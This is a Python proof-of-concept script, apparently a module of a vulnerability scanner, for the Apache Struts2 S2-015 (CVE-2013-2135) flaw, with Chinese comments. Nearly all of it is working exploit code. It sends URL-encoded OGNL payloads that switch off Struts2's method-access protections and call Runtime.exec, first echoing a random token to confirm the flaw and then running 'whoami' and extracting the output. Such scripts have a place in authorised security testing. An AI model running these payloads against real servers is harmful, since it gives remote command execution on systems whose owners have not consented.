#!/usr/bin/env python3

'''
name: Struts2 S2-015漏洞，又名CVE-2013-2135漏洞
description: Struts2 S2-015漏洞可执行任意命令
'''

import re
import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_015_BaseVerify:
    def __init__(self, url):
        self.url = url 
        self.capta = get_capta() 
        self.headers = {
                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                   'Connection': "keep-alive",
                  }
        self.check_payload = '''/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(''' + '\'' + urllib.parse.quote(('echo' + ' ' + self.capta), 'utf-8') + '\'' + ''').getInputStream())%2C%23q%7D.action'''
        self.cmd_payload = '''/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('whoami').getInputStream())%2C%23q%7D.action'''
    
    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.get(self.url + self.check_payload, headers = self.headers)
            if self.capta in check_req.text:
                cmd_req = request.get(self.url + self.cmd_payload, headers = self.headers)
                result = re.findall('''Message</b>(.*?).jsp''', cmd_req.text)
                cmd_str = re.sub('/', '', result[0] )
                cmd_str = re.sub('%0A', '\n', cmd_str )
                #print('存在S2-015漏洞,执行whoami命令成功，结果为：', cmd_str)
                return True
            else:
                #print('不存在S2-015漏洞!')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_015 = S2_015_BaseVerify('http://192.168.30.242:8080')
    S2_015.run()
